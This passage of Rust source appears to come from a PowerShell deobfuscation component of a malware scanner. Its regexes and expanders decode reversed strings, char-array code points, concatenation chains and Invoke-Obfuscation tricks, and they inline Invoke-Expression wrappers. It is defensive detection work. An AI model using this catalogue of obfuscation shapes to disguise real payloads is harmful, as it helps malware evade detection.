        r#"\(\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*\[\s*-1\s*\.\.\s*-(\d+)\s*\]\s*-join\s*(?:''|"")\s*\)|(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*\[\s*-1\s*\.\.\s*-(\d+)\s*\]\s*-join\s*(?:''|"")"#,
    )
    .expect("reverse string slice join")
});

fn expand_reverse_string_slice_join(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "-join") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = REVERSE_STRING_SLICE_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let value = caps
                .get(1)
                .or_else(|| caps.get(2))
                .or_else(|| caps.get(4))
                .or_else(|| caps.get(5))?
                .as_str();
            let requested_len: usize =
                caps.get(3).or_else(|| caps.get(6))?.as_str().parse().ok()?;
            let reversed = reverse_literal_prefix(value, requested_len)?;
            Some((full.start(), full.end(), format!("'{}'", reversed)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[allow(clippy::expect_used)]
static TOCHARARRAY_REVERSE_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?:'([^']*)'|"([^"]*)")\s*;\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\.ToCharArray\s*\(\s*\)\s*;\s*\[array\]::Reverse\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*;\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*-join\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
    )
    .expect("tochararray reverse join")
});

#[allow(clippy::expect_used)]
static LITERAL_TOCHARARRAY_REVERSE_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$[A-Za-z_][A-Za-z0-9_]*\s*=\s*(?:'([^']*)'|"([^"]*)")\s*;.{0,300}?\$[A-Za-z_][A-Za-z0-9_]*\s*=\s*(?:'([^']*)'|"([^"]*)")\s*\.ToCharArray\s*\(\s*\)\s*;.{0,200}?\[array\]::Reverse\s*\(\s*(?:'([^']*)'|"([^"]*)")\s*\)\s*;.{0,200}?(\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*-join\s*\(\s*(?:'([^']*)'|"([^"]*)")\s*\))"#,
    )
    .expect("literal tochararray reverse join")
});

fn expand_tochararray_reverse_join(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "tochararray")
        || !contains_ascii_case_insensitive(text, "reverse")
        || !contains_ascii_case_insensitive(text, "-join")
    {
        return text.to_string();
    }
    let mut matches: Vec<(usize, usize, String)> = TOCHARARRAY_REVERSE_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let src_var = caps.get(1)?.as_str();
            let value = caps.get(2).or_else(|| caps.get(3))?.as_str();
            let arr_var = caps.get(4)?.as_str();
            let src_ref = caps.get(5)?.as_str();
            let reverse_ref = caps.get(6)?.as_str();
            let dst_var = caps.get(7)?.as_str();
            let join_ref = caps.get(8)?.as_str();
            if src_ref != src_var || reverse_ref != arr_var || join_ref != arr_var {
                return None;
            }
            let reversed = reverse_literal_value(value);
            let replacement = format!(
                "${src_var}='{value}';${arr_var}=${src_var}.ToCharArray();[array]::Reverse(${arr_var});${dst_var}='{reversed}'"
            );
            Some((full.start(), full.end(), replacement))
        })
        .collect();
    matches.extend(
        LITERAL_TOCHARARRAY_REVERSE_JOIN_RE
            .captures_iter(text)
            .filter_map(|caps| {
                let value = caps.get(1).or_else(|| caps.get(2))?.as_str();
                let arr_value = caps.get(3).or_else(|| caps.get(4))?.as_str();
                let reverse_value = caps.get(5).or_else(|| caps.get(6))?.as_str();
                let final_assignment = caps.get(7)?;
                let dst_var = caps.get(8)?.as_str();
                let join_value = caps.get(9).or_else(|| caps.get(10))?.as_str();
                if value != arr_value || value != reverse_value || value != join_value {
                    return None;
                }
                let reversed = reverse_literal_value(value);
                Some((
                    final_assignment.start(),
                    final_assignment.end(),
                    format!("${dst_var}='{reversed}'"),
                ))
            }),
    );
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn reverse_literal_value(value: &str) -> String {
    if value.is_ascii() {
        let mut out = String::with_capacity(value.len());
        for &byte in value.as_bytes().iter().rev() {
            out.push(byte as char);
        }
        return out;
    }
    value.chars().rev().collect()
}

fn reverse_literal_prefix(value: &str, requested_len: usize) -> Option<String> {
    if requested_len == 0 {
        return None;
    }
    if value.is_ascii() {
        let bytes = value.as_bytes();
        if requested_len > bytes.len() {
            return None;
        }
        let mut out = String::with_capacity(requested_len);
        for &byte in bytes.iter().rev().take(requested_len) {
            out.push(byte as char);
        }
        return Some(out);
    }
    let chars: Vec<char> = value.chars().collect();
    if requested_len > chars.len() {
        return None;
    }
    Some(chars.iter().rev().take(requested_len).collect())
}

fn previous_non_whitespace_ascii_byte(text: &str, pos: usize) -> Option<u8> {
    let bytes = text.as_bytes();
    let mut idx = pos.min(bytes.len());
    while idx > 0 {
        idx -= 1;
        let byte = bytes[idx];
        if byte.is_ascii_whitespace() {
            continue;
        }
        return Some(byte);
    }
    None
}

fn expand_ps_join(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "-join") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let parts_text = caps.get(1)?.as_str();
            let sep = caps.get(2).or_else(|| caps.get(3))?.as_str();
            let parts: Vec<String> = JOIN_PART_RE
                .captures_iter(parts_text)
                .filter_map(|c| {
                    c.get(1)
                        .or_else(|| c.get(2))
                        .map(|m| m.as_str().to_string())
                })
                .collect();
            if parts.is_empty() {
                return None;
            }
            Some((full.start(), full.end(), format!("'{}'", parts.join(sep))))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod ps_join_prefilter_tests {
    use super::expand_ps_join;

    #[test]
    fn ignores_text_without_join_operator() {
        let text = "Write-Host 'hello world'";
        assert_eq!(expand_ps_join(text), text);
    }
}

#[allow(clippy::expect_used)]
static PS_VAR_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    // $name = 'literal', $name = "literal", or the common no-op subexpression
    // wrapper $name = $('literal'). Double-quoted values with interpolation or
    // metacharacters are intentionally skipped.
    Regex::new(
        r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?:\$\(\s*)?(?:'((?:''|[^'])*)'|"([^"`$\\]*(?:\\.[^"`$\\]*)*)")(?:\s*\))?"#,
    )
    .expect("ps var assign")
});

#[allow(clippy::expect_used)]
static PS_VAR_APPEND_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*\+=\s*(?:'((?:''|[^'])*)'|"([^"`$\\]*(?:\\.[^"`$\\]*)*)")"#,
    )
    .expect("ps var append")
});

#[allow(clippy::expect_used)]
static PS_ARRAY_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*@?\(?\s*((?:(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*,\s*)+(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"))\s*\)?"#)
        .expect("ps array assign")
});

#[allow(clippy::expect_used)]
static PS_JOIN_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\(?\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*-join\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*\)?"#)
        .expect("ps join assign")
});

#[allow(clippy::expect_used)]
static PS_VAR_REF_RE: Lazy<Regex> = Lazy::new(|| {
    // $name reference
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)"#).expect("ps var ref")
});

#[allow(clippy::expect_used)]
static PS_INDEX_CONCAT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*((?:\$[A-Za-z_][A-Za-z0-9_]*\s*\[\s*\d+\s*\]\s*\+\s*)+\$[A-Za-z_][A-Za-z0-9_]*\s*\[\s*\d+\s*\])"#,
    )
    .expect("ps index concat assign")
});

#[allow(clippy::expect_used)]
static PS_VAR_CONCAT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*((?:\$[A-Za-z_][A-Za-z0-9_]*\s*\+\s*)+\$[A-Za-z_][A-Za-z0-9_]*)"#,
    )
    .expect("ps var concat assign")
});

#[allow(clippy::expect_used)]
static PS_INDEX_REF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*(\d+)\s*\]"#).expect("ps index ref")
});

fn ps_literal_assignment_value(caps: &regex::Captures<'_>) -> Option<String> {
    caps.get(2)
        .map(|m| m.as_str().replace("''", "'"))
        .or_else(|| caps.get(3).map(|m| m.as_str().to_string()))
}

fn expand_ps_index_concat_assignments(text: &str) -> String {
    if !text.contains('[') || !text.contains('+') {
        return text.to_string();
    }
    let mut bindings: std::collections::HashMap<String, String> = std::collections::HashMap::new();
    for caps in PS_VAR_ASSIGN_RE.captures_iter(text) {
        if let (Some(n), Some(v)) = (caps.get(1), ps_literal_assignment_value(&caps)) {
            bindings.insert(n.as_str().to_ascii_lowercase(), v);
        }
    }
    if bindings.is_empty() {
        return text.to_string();
    }

    let matches: Vec<(usize, usize, String)> = PS_INDEX_CONCAT_ASSIGN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let dst = caps.get(1)?.as_str();
            let rhs = caps.get(2)?.as_str();
            let mut decoded = String::new();
            for ref_caps in PS_INDEX_REF_RE.captures_iter(rhs) {
                let var = ref_caps.get(1)?.as_str();
                let idx: usize = ref_caps.get(2)?.as_str().parse().ok()?;
                let value = bindings.get(&var.to_ascii_lowercase())?;
                decoded.push(value.chars().nth(idx)?);
            }
            if decoded.is_empty() {
                return None;
            }
            Some((full.start(), full.end(), format!("${dst}='{}'", decoded)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod ps_index_concat_prefilter_tests {
    use super::expand_ps_index_concat_assignments;

    #[test]
    fn ignores_text_without_index_concat_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_ps_index_concat_assignments(text), text);
    }
}

fn expand_ps_variables(text: &str) -> String {
    if !text.contains('$') || !text.contains('=') {
        return text.to_string();
    }
    let mut bindings: std::collections::HashMap<String, String> = std::collections::HashMap::new();
    for caps in PS_VAR_ASSIGN_RE.captures_iter(text) {
        if let (Some(n), Some(v)) = (caps.get(1), ps_literal_assignment_value(&caps)) {
            let after = text[caps.get(0).map_or(0, |m| m.end())..].trim_start();
            if after.starts_with('+') {
                continue;
            }
            bindings.insert(n.as_str().to_ascii_lowercase(), v);
        }
    }
    for caps in PS_ARRAY_ASSIGN_RE.captures_iter(text) {
        let (Some(n), Some(parts_text)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let parts: Vec<String> = JOIN_PART_RE
            .captures_iter(parts_text.as_str())
            .filter_map(|c| {
                c.get(1)
                    .or_else(|| c.get(2))
                    .map(|m| m.as_str().to_string())
            })
            .collect();
        if !parts.is_empty() {
            bindings.insert(n.as_str().to_ascii_lowercase(), parts.join(""));
        }
    }
    for caps in PS_JOIN_ASSIGN_RE.captures_iter(text) {
        let (Some(dst), Some(src), Some(sep)) = (
            caps.get(1),
            caps.get(2),
            caps.get(3).or_else(|| caps.get(4)),
        ) else {
            continue;
        };
        if let Some(value) = bindings.get(&src.as_str().to_ascii_lowercase()).cloned() {
            let joined = if sep.as_str().is_empty() {
                value
            } else {
                value
                    .chars()
                    .map(|c| c.to_string())
                    .collect::<Vec<_>>()
                    .join(sep.as_str())
            };
            bindings.insert(dst.as_str().to_ascii_lowercase(), joined);
        }
    }
    for caps in PS_VAR_CONCAT_ASSIGN_RE.captures_iter(text) {
        let (Some(dst), Some(rhs)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let mut joined = String::new();
        let mut ok = false;
        for part in PS_VAR_REF_RE.captures_iter(rhs.as_str()) {
            let Some(name) = part.get(1).map(|m| m.as_str()) else {
                continue;
            };
            let Some(value) = bindings.get(&name.to_ascii_lowercase()) else {
                ok = false;
                break;
            };
            joined.push_str(value);
            ok = true;
        }
        if ok && !joined.is_empty() {
            bindings.insert(dst.as_str().to_ascii_lowercase(), joined);
        }
    }
    if bindings.is_empty() {
        return text.to_string();
    }

    // Replace $name references with 'value' (quoted, so URL regexes still match).
    // Collect all replacements from original text, then apply in reverse order.
    let matches: Vec<(usize, usize, String)> = PS_VAR_REF_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let name = caps.get(1)?.as_str();
            // Don't replace inside assignment LHS — heuristic: skip refs
            // immediately followed by an assignment operator, but not equality.
            let after = &text[full.end()..];
            let after_trim = after.trim_start();
            if is_ps_assignment_operator(after_trim) {
                return None;
            }
            bindings.get(&name.to_ascii_lowercase()).and_then(|v| {
                if is_large_literal_carrier(v) {
                    return None;
                }
                Some((full.start(), full.end(), format!("'{}'", v)))
            })
        })
        .collect();

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod ps_variables_prefilter_tests {
    use super::expand_ps_variables;

    #[test]
    fn ignores_text_without_assignment_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_ps_variables(text), text);
    }
}

fn is_large_literal_carrier(value: &str) -> bool {
    value.len() >= 64 * 1024
        || (value.len() >= 8192
            && value
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=')))
}

fn is_ps_assignment_operator(text: &str) -> bool {
    if text.starts_with("==") {
        return false;
    }
    text.starts_with('=')
        || text.starts_with("+=")
        || text.starts_with("-=")
        || text.starts_with("*=")
        || text.starts_with("/=")
        || text.starts_with("%=")
}

// ---- Space-concat expander (Pattern C) ----

#[allow(clippy::expect_used)]
static SPACE_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    // 'a' 'b' 'c' ...  (2+ adjacent single-quoted strings separated by whitespace ONLY,
    // no + or - operator between them)
    // The separator between strings is pure whitespace (no operator chars).
    Regex::new(r#"'[^']*'(?:\s+'[^']*')+"#).expect("space concat")
});

#[allow(clippy::expect_used)]
static SPACE_PART_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"'([^']*)'").expect("space concat part"));

fn expand_space_concat(text: &str) -> String {
    if !text.contains("' '") && !text.contains("'  '") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = SPACE_CONCAT_RE
        .find_iter(text)
        .filter_map(|m| {
            let s = m.as_str();
            // Extract all single-quoted parts
            let parts: Vec<String> = SPACE_PART_RE
                .captures_iter(s)
                .filter_map(|c| c.get(1).map(|cap| cap.as_str().to_string()))
                .collect();
            if parts.len() < 2 {
                return None;
            }
            let combined = parts.join("");
            Some((m.start(), m.end(), format!("'{}'", combined)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod space_concat_prefilter_tests {
    use super::expand_space_concat;

    #[test]
    fn ignores_text_without_space_concat_shape() {
        let text = "Write-Host 'hello world'";
        assert_eq!(expand_space_concat(text), text);
    }
}

// ---- Char-array chunk expander (Pattern D) ----

#[allow(clippy::expect_used)]
static CHAR_ARRAY_CHUNK_RE: Lazy<Regex> = Lazy::new(|| {
    // ([char[]]@( N1,N2,N3 )-join '')
    Regex::new(r#"\(\[char\[\]\]\s*@\(\s*((?:\d+\s*,\s*)*\d+)\s*\)\s*-join\s*['"][^'"]*['"]\s*\)"#)
        .expect("char arr chunk")
});

#[allow(clippy::expect_used)]
static STRING_JOIN_CHAR_ARRAY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?String\]::Join\s*\(\s*['"]([^'"]*)['"]\s*,\s*\[char\[\]\]\s*@?\(\s*((?:0x[0-9a-f]+|\d+)\s*(?:,\s*(?:0x[0-9a-f]+|\d+)\s*){2,})\)\s*\)"#,
    )
    .expect("string join char array")
});

#[allow(clippy::expect_used)]
static UNARY_JOIN_CHAR_ARRAY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)-join\s+\[char\[\]\]\s*@?\(\s*((?:0x[0-9a-f]+|\d+)\s*(?:,\s*(?:0x[0-9a-f]+|\d+)\s*){2,})\)\s*"#,
    )
    .expect("unary join char array")
});

fn decode_char_array_nums(nums_str: &str) -> Option<String> {
    if !nums_str.is_ascii() {
        return None;
    }
    let mut out = String::new();
    for part in nums_str.as_bytes().split(|b| *b == b',') {
        let part = std::str::from_utf8(part).ok()?.trim();
        let n: u32 = part.parse().ok()?;
        out.push(char::from_u32(n)?);
    }
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}

fn decode_ps_char_array_nums(nums_str: &str, separator: &str) -> Option<String> {
    let chars: Vec<String> = nums_str
        .split(',')
        .map(|part| {
            let value = parse_ps_char_codepoint(part.trim())?;
            char::from_u32(value).map(|ch| ch.to_string())
        })
        .collect::<Option<_>>()?;
    if chars.is_empty() || chars.len() > 128 * 1024 {
        return None;
    }
    Some(chars.join(separator))
}

fn expand_string_join_char_arrays(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "string]::join")
        || !contains_ascii_case_insensitive(text, "char[]")
    {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = STRING_JOIN_CHAR_ARRAY_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let separator = caps.get(1)?.as_str();
            let decoded = decode_ps_char_array_nums(caps.get(2)?.as_str(), separator)?;
            Some((
                full.start(),
                full.end(),
                format!("'{}'", decoded.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_unary_join_char_arrays(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "-join")
        || !contains_ascii_case_insensitive(text, "char[]")
    {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = UNARY_JOIN_CHAR_ARRAY_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let decoded = decode_ps_char_array_nums(caps.get(1)?.as_str(), "")?;
            Some((
                full.start(),
                full.end(),
                format!("'{}'", decoded.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn contains_char_array_chunk_shape(text: &str) -> bool {
    contains_ascii_case_insensitive(text, "([char[]]@(")
        && contains_ascii_case_insensitive(text, "-join")
}

fn expand_char_array_concat_chunks(text: &str) -> String {
    if !contains_char_array_chunk_shape(text) {
        return text.to_string();
    }
    let mut manual_matches = Vec::new();
    let mut search_from = 0;
    while let Some(start) = find_ascii_case_insensitive_from(text, "([char[]]@(", search_from) {
        let Some((mut end, first)) = parse_char_array_chunk_at(text, start) else {
            search_from = start + 1;
            continue;
        };
        let mut decoded = first;
        let mut count = 1;
        loop {
            let rest = &text[end..];
            let trimmed = rest.trim_start();
            if !trimmed.starts_with('+') {
                break;
            }
            let ws = rest.len() - trimmed.len();
            let after_plus = &trimmed[1..];
            let after_plus_trimmed = after_plus.trim_start();
            let next_start = end + ws + 1 + (after_plus.len() - after_plus_trimmed.len());
            let Some((next_end, next_decoded)) = parse_char_array_chunk_at(text, next_start) else {
                break;
            };
            decoded.push_str(&next_decoded);
            end = next_end;
            count += 1;
        }
        if count > 1 {
            manual_matches.push((start, end, format!("'{}'", decoded)));
            search_from = end;
        } else {
            search_from = start + 1;
        }
    }
    if !manual_matches.is_empty() {
        let mut out = text.to_string();
        for (start, end, replacement) in manual_matches.into_iter().rev() {
            out.replace_range(start..end, &replacement);
        }
        return out;
    }

    let chunks: Vec<(usize, usize, String)> = CHAR_ARRAY_CHUNK_RE
        .captures_iter(text)
        .filter_map(|m| {
            let full = m.get(0)?;
            let decoded = decode_char_array_nums(m.get(1)?.as_str())?;
            Some((full.start(), full.end(), decoded))
        })
        .collect();
    let mut matches = Vec::new();
    let mut i = 0;
    while i < chunks.len() {
        let (start, mut end, first) = chunks[i].clone();
        let mut decoded = first;
        let mut j = i + 1;
        while j < chunks.len() {
            let between = text[end..chunks[j].0].trim();
            if between != "+" {
                break;
            }
            decoded.push_str(&chunks[j].2);
            end = chunks[j].1;
            j += 1;
        }
        if j > i + 1 {
            matches.push((start, end, format!("'{}'", decoded)));
            i = j;
        } else {
            i += 1;
        }
    }
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn parse_char_array_chunk_at(text: &str, start: usize) -> Option<(usize, String)> {
    let prefix = "([char[]]@(";
    if !contains_ascii_case_insensitive(&text[start..], prefix) {
        return None;
    }
    let nums_start = start + prefix.len();
    let nums_end = text[nums_start..].find(')')? + nums_start;
    let decoded = decode_char_array_nums(&text[nums_start..nums_end])?;
    let after_nums = &text[nums_end + 1..];
    let after_trimmed = after_nums.trim_start();
    if !contains_ascii_case_insensitive(after_trimmed, "-join") {
        return None;
    }
    let chunk_end = nums_end + 1 + after_nums.find(')')? + 1;
    Some((chunk_end, decoded))
}

fn expand_char_array_chunks(text: &str) -> String {
    if !contains_char_array_chunk_shape(text) {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = CHAR_ARRAY_CHUNK_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let s = decode_char_array_nums(caps.get(1)?.as_str())?;
            Some((full.start(), full.end(), format!("'{}'", s)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    // After each chunk becomes 'x', a chain like 'a' + 'b' + 'c' is now standard PS
    // concatenation — expand_string_concat (already in pipeline) handles that.
    out
}

#[cfg(test)]
mod char_array_chunk_prefilter_tests {
    use super::{expand_char_array_chunks, expand_char_array_concat_chunks};

    #[test]
    fn ignores_text_without_char_array_chunk_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_char_array_concat_chunks(text), text);
        assert_eq!(expand_char_array_chunks(text), text);
    }
}

// ---- Skip-Nth-Char decoder (Invoke-Obfuscation pattern) ----

#[allow(clippy::expect_used)]
static SKIP_NTH_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    // Matches: function NAME(...){ ... } or New-Item function definitions.
    // Captures: group 1 = fn name from `function NAME`, group 2 = fn name from `-n/-Name NAME`
    // The body must contain a do{...} until loop with $idx += N pattern.
    Regex::new(
        r#"(?is)(?:function\s+(\w+)\s*\([^)]*\)|-(?:n|name)\s+(\w+))\s*[^{]*\{([^{}]*?do\s*\{[^{}]*?\$(\w+)\s*\+=\s*(\d+)[^{}]*?\}[^{}]*?until[^{}]*?)\}"#
    ).expect("skip-nth def")
});

#[allow(clippy::expect_used)]
static SKIP_NTH_INIT_RE: Lazy<Regex> = Lazy::new(|| {
    // Extracts: $idx = N (initializer before the loop)
    Regex::new(r#"\$(\w+)\s*=\s*(\d+)"#).expect("skip-nth init")
});

#[allow(clippy::expect_used)]
static INVOKE_EXPRESSION_WRAPPER_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:function\s+(\w+)\s*\([^)]*\)|-(?:n|name)\s+(\w+))\s*[^{]*\{[^{}]*invoke-expression[^{}]*\}"#,
    )
    .expect("invoke-expression wrapper def")
});

fn expand_invoke_expression_wrappers(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "invoke-expression")
        && !contains_ascii_case_insensitive(text, "iex")
    {
        return text.to_string();
    }
    let names: Vec<String> = INVOKE_EXPRESSION_WRAPPER_DEF_RE
        .captures_iter(text)
        .filter_map(|caps| {
            caps.get(1)
                .or_else(|| caps.get(2))
                .map(|m| m.as_str().to_string())
        })
        .collect();
    if names.is_empty() {
        return text.to_string();
    }

    let mut out = text.to_string();
    for name in names {
        out = inline_ps_literal_calls(&out, &name);
    }
    out
}

#[cfg(test)]
mod invoke_expression_wrapper_prefilter_tests {
    use super::expand_invoke_expression_wrappers;

    #[test]
    fn ignores_text_without_invoke_expression_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_invoke_expression_wrappers(text), text);
    }
}

#[allow(clippy::expect_used)]
static PASSTHROUGH_CALL_WRAPPER_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:function\s+(\w+)\s*\(\s*\$(\w+)\s*\)|-(?:n|name)\s+(\w+))\s*[^{]*\{.{0,4096}?&\s*\(?\s*'([^']+)'\s*\)?\s*\(\s*\$(\w+)\s*\)"#,
    )
    .expect("passthrough call wrapper def")
});

fn is_ps_command_atom(value: &str) -> bool {
    !value.is_empty()
        && value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-'))
}

fn inline_ps_literal_calls_to_target(text: &str, name: &str, target: &str) -> String {
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut search_from = 0;

    while let Some(start) = find_ascii_case_insensitive_from(text, name, search_from) {
        let end_name = start + name.len();
        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
            || is_ident_byte(bytes.get(end_name).copied())
        {
            search_from = end_name;
            continue;
        }

        let mut pos = skip_ascii_ws(bytes, end_name);
        let parenthesized = bytes.get(pos) == Some(&b'(');
        if parenthesized {
            pos = skip_ascii_ws(bytes, pos + 1);
        }
        if bytes.get(pos) != Some(&b'\'') {
            search_from = end_name;
            continue;
        }
        let Some((literal_end, value)) = parse_ps_single_quoted_literal(text, pos) else {
            search_from = end_name;
            continue;
        };
        let mut call_end = literal_end;
        if parenthesized {
            let after = skip_ascii_ws(bytes, call_end);
            if bytes.get(after) != Some(&b')') {
                search_from = end_name;
                continue;
            }
            call_end = after + 1;
        }
        let raw_match = &text[start..call_end];
        let name_start = raw_match
            .find(|c: char| c.is_alphanumeric() || c == '_')
            .unwrap_or(0);
        let prefix = &raw_match[..name_start];
        matches.push((
            start,
            call_end,
            format!("{}{} ('{}')", prefix, target, value.replace('\'', "''")),
        ));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_passthrough_call_wrappers(text: &str) -> String {
    if !contains_potential_passthrough_call_wrapper(text) {
        return text.to_string();
    }
    let defs: Vec<(String, String)> = PASSTHROUGH_CALL_WRAPPER_DEF_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let name = caps
                .get(1)
                .or_else(|| caps.get(3))
                .map(|m| m.as_str().to_string())?;
            let target = caps.get(4)?.as_str().to_string();
            let param = caps.get(2).or_else(|| caps.get(5))?.as_str();
            let body_param = caps.get(5)?.as_str();
            if !param.eq_ignore_ascii_case(body_param) || !is_ps_command_atom(&target) {
                return None;
            }
            if target.eq_ignore_ascii_case("invoke-expression")
                || target.eq_ignore_ascii_case("iex")
            {
                return None;
            }
            Some((name, target))
        })
        .collect();
    if defs.is_empty() {
        return text.to_string();
    }

    let mut out = text.to_string();
    for (name, target) in defs {
        out = inline_ps_literal_calls_to_target(&out, &name, &target);
    }

    out
}

fn contains_potential_passthrough_call_wrapper(text: &str) -> bool {
    let bytes = text.as_bytes();
    let mut idx = 0usize;
    while idx < bytes.len() {
        let Some(rel) = bytes[idx..].iter().position(|b| *b == b'&') else {
            break;
        };
        let mut pos = idx + rel + 1;
        while let Some(b) = bytes.get(pos) {
            match b {
                b' ' | b'\t' | b'\r' | b'\n' => pos += 1,
                b'(' => {
                    pos += 1;
                    while let Some(b) = bytes.get(pos) {
                        match b {
                            b' ' | b'\t' | b'\r' | b'\n' => pos += 1,
                            b'\'' => return true,
                            _ => break,
                        }
                    }
                    break;
                }
                b'\'' => return true,
                _ => break,
            }
        }
        idx = pos.saturating_add(1).min(bytes.len());
    }
    false
}

fn inline_ps_literal_calls(text: &str, name: &str) -> String {
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut search_from = 0;

    while let Some(start) = find_ascii_case_insensitive_from(text, name, search_from) {
        let end_name = start + name.len();
        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
            || is_ident_byte(bytes.get(end_name).copied())
        {
            search_from = end_name;
            continue;
        }

        let mut pos = skip_ascii_ws(bytes, end_name);
        let parenthesized = bytes.get(pos) == Some(&b'(');
        if parenthesized {
            pos = skip_ascii_ws(bytes, pos + 1);
        }
        if bytes.get(pos) != Some(&b'\'') {
            search_from = end_name;
            continue;
        }
